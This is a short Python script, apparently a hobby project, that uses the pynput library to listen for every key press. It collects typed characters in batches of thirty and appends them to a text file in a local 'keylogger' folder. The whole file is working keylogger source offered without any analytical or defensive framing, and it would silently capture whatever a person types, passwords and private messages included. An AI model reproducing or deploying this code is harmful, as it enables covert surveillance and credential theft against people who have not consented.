from pynput.keyboard import Listener,Key
liste=list()
def bas(key):
    global liste
    try:
        liste.append(key.char)
    except AttributeError:
        pass
    if len(liste) >=30:
        dosya_yaz()
        liste=list()

def birak(key):
    pass
def dosya_yaz():
    global liste

    with open("C:/Users/zeyne/OneDrive/Desktop/keylogger/key.txt","a",encoding="utf-8") as file:
        for x in liste:
            file.write(x)

with Listener(on_press=bas,on_release=birak) as Listener:
    Listener.join()
